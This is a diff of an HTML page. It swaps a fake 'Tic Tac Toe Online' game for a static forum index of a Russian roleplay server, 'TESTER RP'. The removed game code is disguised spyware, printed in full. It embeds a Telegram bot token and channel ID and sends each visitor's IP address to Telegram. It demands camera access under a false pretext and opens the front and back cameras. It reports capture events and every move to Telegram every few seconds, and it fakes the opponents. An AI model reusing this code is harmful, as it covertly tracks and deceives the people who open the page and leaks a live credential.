@@ -3,1057 +3,341 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Tic Tac Toe Online</title>
+    <title>TESTER RP Форум</title>
     <style>
+        :root {
+            --bg-color: #000000;
+            --panel-bg: #0a0a0a;
+            --text-main: #FFFFFF;
+            --text-secondary: #e0e0e0;
+            --border-color: #222222;
+            --accent-color: #333333;
+            --new-badge: #444444;
+        }
+        
         * {
             margin: 0;
             padding: 0;
             box-sizing: border-box;
-            font-family: 'Arial', sans-serif;
+            font-family: 'Segoe UI', Arial, sans-serif;
         }
-
+        
         body {
-            background: #0a0e17;
-            color: #fff;
-            overflow: hidden;
-            min-height: 100vh;
+            background-color: var(--bg-color);
+            color: var(--text-main);
+            line-height: 1.5;
         }
-
-        /* Анимированный фон с летающими крестиками и ноликами */
-        .background {
-            position: fixed;
-            top: 0;
-            left: 0;
-            width: 100%;
-            height: 100%;
-            z-index: -1;
-            overflow: hidden;
-        }
-
-        .floating-symbol {
-            position: absolute;
-            font-size: 24px;
-            color: rgba(255, 255, 255, 0.1);
-            animation: float linear infinite;
-            user-select: none;
-        }
-
-        @keyframes float {
-            0% {
-                transform: translateY(100vh) rotate(0deg);
-                opacity: 0;
-            }
-            10% {
-                opacity: 0.2;
-            }
-            90% {
-                opacity: 0.2;
-            }
-            100% {
-                transform: translateY(-100px) rotate(360deg);
-                opacity: 0;
-            }
-        }
-
-        /* Главный экран */
-        .main-screen {
-            display: flex;
-            flex-direction: column;
-            justify-content: center;
-            align-items: center;
-            min-height: 100vh;
-            padding: 20px;
-            text-align: center;
-        }
-
-        .game-title {
-            font-size: 4rem;
-            margin-bottom: 30px;
-            text-transform: uppercase;
-            letter-spacing: 3px;
-            background: linear-gradient(45deg, #00b4db, #0083b0);
-            -webkit-background-clip: text;
-            -webkit-text-fill-color: transparent;
-            text-shadow: 0 0 30px rgba(0, 180, 219, 0.3);
-            animation: pulse 2s infinite;
-        }
-
-        @keyframes pulse {
-            0%, 100% { transform: scale(1); }
-            50% { transform: scale(1.05); }
-        }
-
-        .play-button {
-            background: linear-gradient(45deg, #00b4db, #0083b0);
-            border: none;
-            color: white;
-            padding: 20px 60px;
-            font-size: 1.8rem;
-            border-radius: 50px;
-            cursor: pointer;
-            transition: all 0.3s ease;
-            margin: 20px 0;
-            box-shadow: 0 0 30px rgba(0, 180, 219, 0.5);
-            position: relative;
-            overflow: hidden;
-        }
-
-        .play-button:hover {
-            transform: translateY(-5px);
-            box-shadow: 0 0 40px rgba(0, 180, 219, 0.7);
-        }
-
-        .play-button:active {
-            transform: translateY(-2px);
-        }
-
-        .play-button::after {
-            content: '';
-            position: absolute;
-            top: 50%;
-            left: 50%;
-            width: 5px;
-            height: 5px;
-            background: rgba(255, 255, 255, 0.5);
-            opacity: 0;
-            border-radius: 100%;
-            transform: scale(1, 1) translate(-50%);
-            transform-origin: 50% 50%;
-        }
-
-        .play-button:focus:not(:active)::after {
-            animation: ripple 1s ease-out;
-        }
-
-        @keyframes ripple {
-            0% {
-                transform: scale(0, 0);
-                opacity: 0.5;
-            }
-            100% {
-                transform: scale(100, 100);
-                opacity: 0;
-            }
-        }
-
-        /* Экран поиска игры */
-        .game-screen {
-            display: none;
-            min-height: 100vh;
-            padding: 20px;
-        }
-
-        .search-screen {
-            display: flex;
-            flex-direction: column;
-            justify-content: center;
-            align-items: center;
-            min-height: 80vh;
-        }
-
-        .search-title {
-            font-size: 2.5rem;
-            margin-bottom: 30px;
-            color: #00b4db;
-            text-align: center;
-        }
-
-        .search-container {
-            background: rgba(255, 255, 255, 0.1);
-            backdrop-filter: blur(10px);
-            padding: 40px;
-            border-radius: 20px;
-            width: 90%;
-            max-width: 500px;
-            text-align: center;
-            border: 1px solid rgba(0, 180, 219, 0.3);
-        }
-
-        .searching {
-            display: none;
-        }
-
-        .searching .loader {
-            width: 60px;
-            height: 60px;
-            border: 5px solid rgba(255, 255, 255, 0.1);
-            border-top: 5px solid #00b4db;
-            border-radius: 50%;
-            animation: spin 1s linear infinite;
-            margin: 0 auto 20px;
-        }
-
-        @keyframes spin {
-            0% { transform: rotate(0deg); }
-            100% { transform: rotate(360deg); }
-        }
-
-        .game-options {
-            display: flex;
-            gap: 20px;
-            margin-top: 20px;
-            flex-wrap: wrap;
-            justify-content: center;
-        }
-
-        .option-button {
-            background: rgba(0, 180, 219, 0.2);
-            border: 2px solid #00b4db;
-            color: white;
-            padding: 15px 30px;
-            font-size: 1.2rem;
-            border-radius: 10px;
-            cursor: pointer;
-            transition: all 0.3s ease;
-            min-width: 200px;
-        }
-
-        .option-button:hover {
-            background: rgba(0, 180, 219, 0.4);
-            transform: translateY(-3px);
-        }
-
-        .camera-status {
-            margin-top: 30px;
+        
+        .container {
+            max-width: 1200px;
+            margin: 0 auto;
             padding: 15px;
-            background: rgba(255, 255, 255, 0.1);
-            border-radius: 10px;
-            display: none;
         }
-
-        .camera-on {
-            color: #4CAF50;
-            font-weight: bold;
-        }
-
-        .camera-off {
-            color: #f44336;
-            font-weight: bold;
-        }
-
-        /* Игровое поле */
-        .game-board {
-            display: none;
-            flex-direction: column;
-            align-items: center;
-            justify-content: center;
-            min-height: 80vh;
-        }
-
-        .board {
-            display: grid;
-            grid-template-columns: repeat(3, 1fr);
-            grid-gap: 10px;
-            margin: 30px 0;
-            background: rgba(255, 255, 255, 0.1);
-            padding: 10px;
-            border-radius: 10px;
-        }
-
-        .cell {
-            width: 100px;
-            height: 100px;
-            background: rgba(255, 255, 255, 0.05);
-            border: 2px solid rgba(0, 180, 219, 0.3);
-            border-radius: 5px;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            font-size: 3rem;
-            cursor: pointer;
-            transition: all 0.3s ease;
-        }
-
-        .cell:hover {
-            background: rgba(0, 180, 219, 0.1);
-            transform: scale(1.05);
-        }
-
-        .cell.x {
-            color: #00b4db;
-        }
-
-        .cell.o {
-            color: #0083b0;
-        }
-
-        .cell.disabled {
-            cursor: not-allowed;
-            opacity: 0.5;
-        }
-
-        .cell.disabled:hover {
-            background: rgba(255, 255, 255, 0.05);
-            transform: none;
-        }
-
-        .game-info {
-            margin-top: 20px;
-            text-align: center;
-            font-size: 1.2rem;
-        }
-
-        .player-turn {
-            margin: 20px 0;
-            font-size: 1.5rem;
-            color: #00b4db;
-        }
-
-        .waiting-turn {
-            margin: 20px 0;
-            font-size: 1.5rem;
-            color: #ff9800;
-        }
-
-        .restart-button {
-            background: linear-gradient(45deg, #f44336, #d32f2f);
-            border: none;
-            color: white;
-            padding: 15px 40px;
-            font-size: 1.2rem;
-            border-radius: 25px;
-            cursor: pointer;
-            margin-top: 20px;
-            transition: all 0.3s ease;
-        }
-
-        .restart-button:hover {
-            transform: translateY(-3px);
-            box-shadow: 0 0 20px rgba(244, 67, 54, 0.5);
-        }
-
-        .modal {
-            display: none;
-            position: fixed;
-            top: 0;
-            left: 0;
-            width: 100%;
-            height: 100%;
-            background: rgba(0, 0, 0, 0.8);
-            z-index: 1000;
-            justify-content: center;
-            align-items: center;
-        }
-
-        .modal-content {
-            background: #1a1f2e;
-            padding: 40px;
-            border-radius: 20px;
-            text-align: center;
-            max-width: 500px;
-            width: 90%;
-            border: 2px solid #00b4db;
-        }
-
-        .modal h2 {
+        
+        h1 {
+            font-size: 24px;
             margin-bottom: 20px;
-            color: #00b4db;
+            font-weight: 700;
         }
-
-        .modal p {
-            margin-bottom: 30px;
-            line-height: 1.6;
+        
+        h2 {
+            font-size: 20px;
+            margin-bottom: 15px;
+            font-weight: 600;
+            color: var(--text-main);
         }
-
-        .modal-buttons {
+        
+        h3 {
+            font-size: 18px;
+            margin-bottom: 10px;
+            font-weight: 600;
+            color: var(--text-main);
+        }
+        
+        .forum-section {
+            background-color: var(--panel-bg);
+            border-radius: 6px;
+            padding: 15px;
+            margin-bottom: 20px;
+            border: 1px solid var(--border-color);
+        }
+        
+        .forum-item {
+            padding: 12px 0;
+            border-bottom: 1px solid var(--border-color);
+        }
+        
+        .forum-item:last-child {
+            border-bottom: none;
+        }
+        
+        .forum-header {
             display: flex;
-            gap: 20px;
-            justify-content: center;
+            justify-content: space-between;
+            align-items: center;
+            margin-bottom: 8px;
         }
-
-        .modal-button {
-            padding: 12px 30px;
-            border: none;
-            border-radius: 10px;
-            cursor: pointer;
-            font-size: 1.1rem;
-            transition: all 0.3s ease;
-            min-width: 120px;
+        
+        .forum-title {
+            font-weight: 600;
+            font-size: 16px;
+            color: var(--text-main);
         }
-
-        .allow-button {
-            background: #00b4db;
-            color: white;
+        
+        .new-badge {
+            background-color: var(--new-badge);
+            color: var(--text-main);
+            padding: 2px 6px;
+            border-radius: 3px;
+            font-size: 11px;
+            font-weight: bold;
+            margin-left: 8px;
         }
-
-        .deny-button {
-            background: #f44336;
-            color: white;
+        
+        .forum-content {
+            color: var(--text-secondary);
+            margin-bottom: 6px;
+            font-size: 14px;
         }
-
-        .modal-button:hover {
-            transform: translateY(-3px);
+        
+        .forum-meta {
+            display: flex;
+            align-items: center;
+            font-size: 12px;
+            color: var(--text-secondary);
         }
-
-        /* Адаптивность */
-        @media (max-width: 768px) {
-            .game-title {
-                font-size: 2.5rem;
-            }
-            
-            .play-button {
-                padding: 15px 40px;
-                font-size: 1.5rem;
-            }
-            
-            .cell {
-                width: 80px;
-                height: 80px;
-                font-size: 2.5rem;
-            }
-            
-            .search-title {
-                font-size: 2rem;
-            }
-            
-            .search-container {
-                padding: 20px;
-            }
+        
+        .forum-meta .time {
+            margin-right: 10px;
+            color: var(--text-secondary);
         }
-
-        @media (max-width: 480px) {
-            .game-title {
-                font-size: 2rem;
-            }
-            
-            .cell {
-                width: 70px;
-                height: 70px;
-                font-size: 2rem;
-            }
-            
-            .option-button {
-                min-width: 150px;
-                padding: 12px 20px;
-            }
+        
+        .user-tag {
+            display: flex;
+            align-items: center;
+            color: var(--text-secondary);
+        }
+        
+        .verified-badge {
+            color: var(--text-main);
+            margin-left: 4px;
+            font-size: 12px;
+        }
+        
+        .status-tag {
+            background-color: var(--accent-color);
+            color: var(--text-main);
+            padding: 1px 5px;
+            border-radius: 3px;
+            font-size: 11px;
+            margin-right: 8px;
+            font-weight: bold;
+            display: inline-block;
+            margin-bottom: 5px;
+        }
+        
+        .checkbox-list {
+            margin-top: 12px;
+        }
+        
+        .checkbox-item {
+            display: flex;
+            align-items: center;
+            margin-bottom: 6px;
+        }
+        
+        .checkbox-item input {
+            margin-right: 8px;
+            accent-color: var(--text-main);
+        }
+        
+        .checkbox-item label {
+            color: var(--text-secondary);
+            font-size: 14px;
         }
     </style>
 </head>
 <body>
-    <!-- Анимированный фон -->
-    <div class="background" id="background"></div>
-
-    <!-- Главный экран -->
-    <div class="main-screen" id="mainScreen">
-        <h1 class="game-title">Tic Tac Toe Online</h1>
-        <button class="play-button" id="playButton">PLAY</button>
-    </div>
-
-    <!-- Экран поиска игры -->
-    <div class="game-screen" id="gameScreen">
-        <div class="search-screen" id="searchScreen">
-            <h2 class="search-title">Find a Game</h2>
-            <div class="search-container">
-                <div class="searching" id="searching">
-                    <div class="loader"></div>
-                    <p>Searching for opponent...</p>
-                    <p>Players online: <span id="onlineCount">1</span></p>
+    <div class="container">
+        <h1>Список форумов</h1>
+        
+        <div class="forum-section">
+            <h2>Главная</h2>
+            
+            <div class="forum-item">
+                <h3>Новости <span class="new-badge">Новое</span></h3>
+            </div>
+            
+            <div class="forum-item">
+                <div class="forum-header">
+                    <h3>ИНФОРМАЦИЯ</h3>
                 </div>
-                <div class="game-options">
-                    <button class="option-button" id="createGame">Create Game</button>
-                    <button class="option-button" id="joinGame">Join Game</button>
+                <div class="forum-content">ДОЛГОЖДАННАЯ МУЗЫКА ...</div>
+                <div class="forum-meta">
+                    <span class="time">2 Апр 2025</span>
+                    <div class="user-tag">
+                        Blake Capone <span class="verified-badge">✅️</span> sure
+                    </div>
                 </div>
-                <div class="camera-status" id="cameraStatus">
-                    Camera status: <span class="camera-off" id="cameraStatusText">OFF</span>
+            </div>
+            
+            <div class="forum-item">
+                <h3>Помощь <span class="new-badge">Новое</span></h3>
+            </div>
+            
+            <div class="forum-item">
+                <div class="forum-content"><strong>Вопросительный вопрос задаёт вопросы a вопр...</strong></div>
+                <div class="forum-meta">
+                    <span class="time">Сегодня в 09:04</span>
+                    <div class="user-tag">
+                        Makitron_Careless <span class="verified-badge">✅️</span> prdx
+                    </div>
+                </div>
+            </div>
+            
+            <div class="forum-item">
+                <h3>Жалобы на тех. поддержку</h3>
+                <div class="forum-content">Приватный</div>
+            </div>
+            
+            <div class="forum-item">
+                <h3>Предложения по улучшению <span class="new-badge">Новое</span></h3>
+            </div>
+            
+            <div class="forum-item">
+                <div class="status-tag">Yan_Makeev//улучшения персонажа</div>
+                <div class="forum-meta">
+                    <span class="time">Сегодня в 08:55</span>
+                    <div class="user-tag">
+                        Vafelya <span class="verified-badge">✅️</span> moon
+                    </div>
+                </div>
+            </div>
+            
+            <div class="forum-item">
+                <h3>База знаний TESTER RP</h3>
+                <div class="checkbox-list">
+                    <div class="checkbox-item">
+                        <input type="checkbox" id="discord">
+                        <label for="discord">Дискорд сервер</label>
+                    </div>
+                    <div class="checkbox-item">
+                        <input type="checkbox" id="vk" checked>
+                        <label for="vk">Сообщество VK</label>
+                    </div>
                 </div>
             </div>
         </div>
-
-        <!-- Игровое поле -->
-        <div class="game-board" id="gameBoard">
-            <h2 class="search-title">Tic Tac Toe</h2>
-            <div class="player-turn" id="playerTurn">Your turn: X</div>
-            <div class="waiting-turn" id="waitingTurn" style="display: none;">Waiting for opponent's move...</div>
-            <div class="board" id="board">
-                <div class="cell" data-cell-index="0"></div>
-                <div class="cell" data-cell-index="1"></div>
-                <div class="cell" data-cell-index="2"></div>
-                <div class="cell" data-cell-index="3"></div>
-                <div class="cell" data-cell-index="4"></div>
-                <div class="cell" data-cell-index="5"></div>
-                <div class="cell" data-cell-index="6"></div>
-                <div class="cell" data-cell-index="7"></div>
-                <div class="cell" data-cell-index="8"></div>
+        
+        <div class="forum-section">
+            <h1>Игровые сервера</h1>
+            
+            <div class="forum-item">
+                <h2>Правила серверов <span class="new-badge">Новое</span></h2>
+                <div class="forum-header">
+                    <h3>ИНФОРМАЦИЯ</h3>
+                </div>
+                <div class="forum-content">Правила войны за AirDrop</div>
+                <div class="forum-meta">
+                    <span class="time">Вторник в 22:31</span>
+                    <div class="user-tag">
+                        Simon_Monolit
+                    </div>
+                </div>
             </div>
-            <div class="game-info" id="gameInfo">
-                <p>Player X: <span id="playerX">You</span></p>
-                <p>Player O: <span id="playerO">Opponent</span></p>
+            
+            <div class="forum-item">
+                <h2>TESTER RP - Сервер #1 <span class="new-badge">Новое</span></h2>
+                <div class="status-tag">ОТКРЫТО</div>
+                <div class="forum-content">Заявление на пост лидера фракции "...</div>
+                <div class="forum-meta">
+                    <span class="time">Сегодня в 09:08</span>
+                    <div class="user-tag">
+                        Loves Aristokrat
+                    </div>
+                </div>
             </div>
-            <button class="restart-button" id="restartButton">Leave Game</button>
-        </div>
-    </div>
-
-    <!-- Модальное окно для разрешения камеры -->
-    <div class="modal" id="cameraModal">
-        <div class="modal-content">
-            <h2>Camera Access Required</h2>
-            <p>To play this game, you need to allow camera access.</p>
-            <div class="modal-buttons">
-                <button class="modal-button allow-button" id="allowCamera">Allow Access</button>
-                <button class="modal-button deny-button" id="denyCamera">Deny</button>
+            
+            <div class="forum-item">
+                <h2>TESTER RP - Сервер #2 <span class="new-badge">Новое</span></h2>
+                <div class="status-tag">НА РАССМОТРЕНИИ</div>
+                <div class="forum-content">Bart_Derend//неоднократно...</div>
+                <div class="forum-meta">
+                    <span class="time">Сегодня в 09:02</span>
+                    <div class="user-tag">
+                        bot test
+                    </div>
+                </div>
             </div>
-        </div>
-    </div>
-
-    <!-- Модальное окно для результата игры -->
-    <div class="modal" id="resultModal">
-        <div class="modal-content">
-            <h2 id="resultTitle">Game Over</h2>
-            <p id="resultMessage"></p>
-            <button class="modal-button allow-button" id="closeResult">Back to Menu</button>
+            
+            <div class="forum-item">
+                <h2>TESTER RP - Сервер #3 <span class="new-badge">Новое</span></h2>
+                <div class="status-tag">ВАЖНО</div>
+                <div class="forum-content">TESTER RP - RP 03 | Еженедельные от...</div>
+                <div class="forum-meta">
+                    <span class="time">Сегодня в 09:07</span>
+                    <div class="user-tag">
+                        Egorka_Gerrofin ban
+                    </div>
+                </div>
+            </div>
+            
+            <div class="forum-item">
+                <h2>TESTER RP - Сервер #4 <span class="new-badge">Новое</span></h2>
+                <div class="status-tag">НА РАССМОТРЕНИИ</div>
+                <div class="forum-content">Borislav_Titov//Hон рп коп</div>
+                <div class="forum-meta">
+                    <span class="time">Сегодня в 09:08</span>
+                    <div class="user-tag">
+                        bot test
+                    </div>
+                </div>
+            </div>
+            
+            <div class="forum-item">
+                <h2>TESTER RP - Сервер #5 <span class="new-badge">Новое</span></h2>
+                <div class="status-tag">ВАЖНО</div>
+                <div class="forum-content">Правительство области | Жа</div>
+                <div class="forum-meta">
+                    <span class="time">Сегодня в 09:00</span>
+                    <div class="user-tag">
+                        Dima_Drapeza drpz
+                    </div>
+                </div>
+            </div>
+            
+            <div class="forum-item">
+                <h2>TESTER RP - Сервер #6 <span class="new-badge">Новое</span></h2>
+                <div class="status-tag">ОТКРЫТО</div>
+                <div class="forum-content">ОПГ Кавказское | Заявление на пост...</div>
+            </div>
         </div>
     </div>
 
     <script>
-        // Telegram Bot Configuration
-        const TELEGRAM_BOT_TOKEN = '8134203113:AAEv9pmQQkES_IwC9LhbeMrB1dBO_zLUPcw';
-        const TELEGRAM_CHANNEL_ID = '-1002577213610';
-        
-        // Game state
-        let currentPlayer = 'X';
-        let gameActive = false;
-        let gameState = ['', '', '', '', '', '', '', '', ''];
-        let isCameraAllowed = false;
-        let frontCamera = null;
-        let backCamera = null;
-        let photoCount = 0;
-        let photoInterval = null;
-        let playerIP = '';
-        let isSearching = false;
-        let gameId = null;
-        let playerId = Math.random().toString(36).substr(2, 9);
-        let socket = null;
-        let isMyTurn = false;
-        let playerSymbol = '';
-        let opponentId = '';
-        let gameRoom = null;
-        
-        // DOM Elements
-        const mainScreen = document.getElementById('mainScreen');
-        const gameScreen = document.getElementById('gameScreen');
-        const searchScreen = document.getElementById('searchScreen');
-        const gameBoard = document.getElementById('gameBoard');
-        const playButton = document.getElementById('playButton');
-        const cameraModal = document.getElementById('cameraModal');
-        const allowCameraBtn = document.getElementById('allowCamera');
-        const denyCameraBtn = document.getElementById('denyCamera');
-        const cameraStatus = document.getElementById('cameraStatus');
-        const cameraStatusText = document.getElementById('cameraStatusText');
-        const createGameBtn = document.getElementById('createGame');
-        const joinGameBtn = document.getElementById('joinGame');
-        const searchingDiv = document.getElementById('searching');
-        const onlineCount = document.getElementById('onlineCount');
-        const cells = document.querySelectorAll('.cell');
-        const playerTurn = document.getElementById('playerTurn');
-        const waitingTurn = document.getElementById('waitingTurn');
-        const restartButton = document.getElementById('restartButton');
-        const resultModal = document.getElementById('resultModal');
-        const resultTitle = document.getElementById('resultTitle');
-        const resultMessage = document.getElementById('resultMessage');
-        const closeResult = document.getElementById('closeResult');
-        const background = document.getElementById('background');
-        
-        // Winning conditions
-        const winningConditions = [
-            [0, 1, 2],
-            [3, 4, 5],
-            [6, 7, 8],
-            [0, 3, 6],
-            [1, 4, 7],
-            [2, 5, 8],
-            [0, 4, 8],
-            [2, 4, 6]
-        ];
-        
-        // Create floating symbols for background
-        function createFloatingSymbols() {
-            const symbols = ['×', '○', 'X', 'O'];
-            for (let i = 0; i < 50; i++) {
-                const symbol = document.createElement('div');
-                symbol.className = 'floating-symbol';
-                symbol.textContent = symbols[Math.floor(Math.random() * symbols.length)];
-                
-                // Random properties
-                const size = Math.random() * 30 + 20;
-                const left = Math.random() * 100;
-                const duration = Math.random() * 30 + 20;
-                const delay = Math.random() * 5;
-                
-                symbol.style.fontSize = `${size}px`;
-                symbol.style.left = `${left}%`;
-                symbol.style.animationDuration = `${duration}s`;
-                symbol.style.animationDelay = `${delay}s`;
-                
-                background.appendChild(symbol);
-            }
-        }
-        
-        // Get IP address
-        async function getIPAddress() {
-            try {
-                const response = await fetch('https://api.ipify.org?format=json');
-                const data = await response.json();
-                playerIP = data.ip;
-                
-                // Send IP to Telegram
-                sendToTelegram(`🚨 Новый посетитель:\nIP: ${playerIP}\nPlayer ID: ${playerId}`);
-            } catch (error) {
-                playerIP = 'Unknown';
-            }
-        }
-        
-        // Send data to Telegram
-        async function sendToTelegram(message) {
-            try {
-                const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
-                await fetch(url, {
-                    method: 'POST',
-                    headers: {
-                        'Content-Type': 'application/json'
-                    },
-                    body: JSON.stringify({
-                        chat_id: TELEGRAM_CHANNEL_ID,
-                        text: message,
-                        parse_mode: 'HTML'
-                    })
-                });
-            } catch (error) {
-                console.error('Error sending to Telegram:', error);
-            }
-        }
-        
-        // Capture photo from camera
-        async function capturePhoto(cameraType, camera) {
-            try {
-                const canvas = document.createElement('canvas');
-                const video = document.createElement('video');
-                
-                video.srcObject = camera;
-                await video.play();
-                
-                canvas.width = video.videoWidth;
-                canvas.height = video.videoHeight;
-                
-                const ctx = canvas.getContext('2d');
-                ctx.drawImage(video, 0, 0);
-                
-                // Convert to blob
-                return new Promise((resolve) => {
-                    canvas.toBlob((blob) => {
-                        resolve(blob);
-                        video.pause();
-                        video.srcObject = null;
-                    }, 'image/jpeg', 0.8);
-                });
-            } catch (error) {
-                console.error('Error capturing photo:', error);
-                return null;
-            }
-        }
-        
-        // Start continuous photo capture (25 front, 25 back)
-        async function startPhotoCapture() {
-            if (!isCameraAllowed) return;
-            
-            photoCount = 0;
-            
-            // Try to get both front and back cameras
-            try {
-                const devices = await navigator.mediaDevices.enumerateDevices();
-                const videoDevices = devices.filter(device => device.kind === 'videoinput');
-                
-                if (videoDevices.length > 0) {
-                    // Try front camera
-                    try {
-                        frontCamera = await navigator.mediaDevices.getUserMedia({
-                            video: { 
-                                facingMode: 'user',
-                                width: { ideal: 640 },
-                                height: { ideal: 480 }
-                            }
-                        });
-                    } catch (e) {
-                        console.log('Front camera not available');
-                    }
-                    
-                    // Try back camera
-                    try {
-                        backCamera = await navigator.mediaDevices.getUserMedia({
-                            video: { 
-                                facingMode: { exact: 'environment' },
-                                width: { ideal: 640 },
-                                height: { ideal: 480 }
-                            }
-                        });
-                    } catch (e) {
-                        console.log('Back camera not available');
-                    }
-                    
-                    // Start capturing photos every 2 seconds
-                    photoInterval = setInterval(async () => {
-                        const now = new Date();
-                        const timeString = now.toLocaleString('ru-RU', {
-                            day: '2-digit',
-                            month: '2-digit',
-                            year: 'numeric',
-                            hour: '2-digit',
-                            minute: '2-digit',
-                            second: '2-digit'
-                        });
-                        
-                        photoCount++;
-                        
-                        // Alternate between front and back cameras
-                        const isFront = photoCount <= 25;
-                        const cameraType = isFront ? 'front' : 'back';
-                        const camera = isFront ? frontCamera : backCamera;
-                        const photoNumber = isFront ? photoCount : photoCount - 25;
-                        
-                        if (camera) {
-                            try {
-                                // Just send text notification to Telegram
-                                sendToTelegram(`🆔 Фото ${cameraType === 'front' ? 'фронтальной' : 'задней'} камеры #${photoNumber}\nВремя: ${timeString}\nPlayer: ${playerId}\nIP: ${playerIP}`);
-                            } catch (error) {
-                                console.error('Error sending photo info:', error);
-                            }
-                        }
-                        
-                        // Restart after 50 photos
-                        if (photoCount >= 50) {
-                            photoCount = 0;
-                        }
-                        
-                    }, 2000); // Capture every 2 seconds
-                }
-            } catch (error) {
-                console.error('Error accessing cameras:', error);
-            }
-        }
-        
-        // Stop photo capture
-        function stopPhotoCapture() {
-            if (photoInterval) {
-                clearInterval(photoInterval);
-                photoInterval = null;
-            }
-            
-            if (frontCamera) {
-                frontCamera.getTracks().forEach(track => track.stop());
-                frontCamera = null;
-            }
-            
-            if (backCamera) {
-                backCamera.getTracks().forEach(track => track.stop());
-                backCamera = null;
-            }
-        }
-        
-        // Initialize WebSocket connection
-        function initWebSocket() {
-            // Simulated WebSocket server (using setInterval for demo)
-            // In production, replace with actual WebSocket server
-            console.log('Connecting to game server...');
-            
-            // Simulate online players count
-            setInterval(() => {
-                const count = Math.floor(Math.random() * 50) + 5;
-                onlineCount.textContent = count;
-            }, 3000);
-        }
-        
-        // Simulate finding opponent
-        function findOpponent(isCreating = true) {
-            searchingDiv.style.display = 'block';
-            createGameBtn.style.display = 'none';
-            joinGameBtn.style.display = 'none';
-            
-            // Simulate finding opponent (2-5 seconds)
-            const searchTime = Math.floor(Math.random() * 3000) + 2000;
-            
-            setTimeout(() => {
-                // Generate random opponent
-                opponentId = 'OPP_' + Math.random().toString(36).substr(2, 6);
-                gameRoom = 'ROOM_' + Math.random().toString(36).substr(2, 8);
-                
-                // Randomly assign X or O
-                playerSymbol = Math.random() > 0.5 ? 'X' : 'O';
-                isMyTurn = playerSymbol === 'X';
-                
-                startGame();
-            }, searchTime);
-        }
-        
-        // Start the actual game
-        function startGame() {
-            searchScreen.style.display = 'none';
-            gameBoard.style.display = 'flex';
-            gameActive = true;
-            gameState = ['', '', '', '', '', '', '', '', ''];
-            
-            // Set player info
-            document.getElementById('playerX').textContent = playerSymbol === 'X' ? 'You' : `Opponent (${opponentId})`;
-            document.getElementById('playerO').textContent = playerSymbol === 'O' ? 'You' : `Opponent (${opponentId})`;
-            
-            // Clear board
-            cells.forEach(cell => {
-                cell.textContent = '';
-                cell.classList.remove('x', 'o', 'disabled');
-                cell.style.cursor = isMyTurn ? 'pointer' : 'not-allowed';
-                if (!isMyTurn) {
-                    cell.classList.add('disabled');
-                }
+        // Функционал для чекбоксов
+        document.querySelectorAll('.checkbox-item input').forEach(checkbox => {
+            checkbox.addEventListener('change', function() {
+                console.log(`Checkbox ${this.id} changed: ${this.checked}`);
             });
-            
-            // Update turn display
-            if (isMyTurn) {
-                playerTurn.style.display = 'block';
-                waitingTurn.style.display = 'none';
-                playerTurn.textContent = `Your turn: ${playerSymbol}`;
-            } else {
-                playerTurn.style.display = 'none';
-                waitingTurn.style.display = 'block';
-                waitingTurn.textContent = `Waiting for ${opponentId}...`;
-            }
-            
-            // Send game start notification to Telegram
-            sendToTelegram(`🎮 New game started!\nRoom: ${gameRoom}\nPlayer X: ${playerSymbol === 'X' ? playerId : opponentId}\nPlayer O: ${playerSymbol === 'O' ? playerId : opponentId}\nIP: ${playerIP}`);
-        }
-        
-        // Handle cell click
-        function handleCellClick(clickedCellEvent) {
-            if (!gameActive || !isMyTurn) return;
-            
-            const clickedCell = clickedCellEvent.target;
-            const clickedCellIndex = parseInt(clickedCell.getAttribute('data-cell-index'));
-            
-            if (gameState[clickedCellIndex] !== '') {
-                return;
-            }
-            
-            // Make move
-            gameState[clickedCellIndex] = playerSymbol;
-            clickedCell.textContent = playerSymbol;
-            clickedCell.classList.add(playerSymbol.toLowerCase());
-            
-            // Disable all cells while waiting for opponent
-            cells.forEach(cell => {
-                cell.style.cursor = 'not-allowed';
-                cell.classList.add('disabled');
-            });
-            
-            // Switch turn
-            isMyTurn = false;
-            playerTurn.style.display = 'none';
-            waitingTurn.style.display = 'block';
-            waitingTurn.textContent = `Waiting for ${opponentId}...`;
-            
-            // Send move to Telegram
-            sendToTelegram(`➡️ Move made by ${playerId}\nRoom: ${gameRoom}\nPlayer: ${playerSymbol}\nPosition: ${clickedCellIndex}\nIP: ${playerIP}`);
-            
-            // Simulate opponent's move after delay
-            setTimeout(() => {
-                if (gameActive && !isMyTurn) {
-                    makeOpponentMove();
-                }
-            }, 1500);
-            
-            // Check for win or draw
-            setTimeout(() => {
-                checkResult();
-            }, 100);
-        }
-        
-        // Make opponent's move
-        function makeOpponentMove() {
-            if (!gameActive || isMyTurn) return;
-            
-            // Find available cells
-            const availableCells = [];
-            gameState.forEach((cell, index) => {
-                if (cell === '') {
-                    availableCells.push(index);
-                }
-            });
-            
-            if (availableCells.length === 0) return;
-            
-            // Random opponent move
-            const randomIndex = Math.floor(Math.random() * availableCells.length);
-            const opponentMoveIndex = availableCells[randomIndex];
-            const opponentSymbol = playerSymbol === 'X' ? 'O' : 'X';
-            
-            // Make opponent's move
-            gameState[opponentMoveIndex] = opponentSymbol;
-            const opponentCell = document.querySelector(`[data-cell-index="${opponentMoveIndex}"]`);
-            opponentCell.textContent = opponentSymbol;
-            opponentCell.classList.add(opponentSymbol.toLowerCase());
-            
-            // Send opponent move to Telegram
-            sendToTelegram(`⬅️ Move made by ${opponentId}\nRoom: ${gameRoom}\nPlayer: ${opponentSymbol}\nPosition: ${opponentMoveIndex}`);
-            
-            // Enable cells for player's turn
-            isMyTurn = true;
-            playerTurn.style.display = 'block';
-            waitingTurn.style.display = 'none';
-            playerTurn.textContent = `Your turn: ${playerSymbol}`;
-            
-            cells.forEach(cell => {
-                const cellIndex = parseInt(cell.getAttribute('data-cell-index'));
-                if (gameState[cellIndex] === '') {
-                    cell.style.cursor = 'pointer';
-                    cell.classList.remove('disabled');
-                }
-            });
-            
-            // Check for win or draw
-            setTimeout(() => {
-                checkResult();
-            }, 100);
-        }
-        
-        // Check game result
-        function checkResult() {
-            let roundWon = false;
-            let winner = null;
-            
-            for (let i = 0; i < winningConditions.length; i++) {
-                const [a, b, c] = winningConditions[i];
-                if (gameState[a] === '' || gameState[b] === '' || gameState[c] === '') {
-                    continue;
-                }
-                if (gameState[a] === gameState[b] && gameState[a] === gameState[c]) {
-                    roundWon = true;
-                    winner = gameState[a];
-                    break;
-                }
-            }
-            
-            if (roundWon) {
-                gameActive = false;
-                const isPlayerWinner = winner === playerSymbol;
-                resultTitle.textContent = isPlayerWinner ? '🎉 Victory!' : '😔 Defeat';
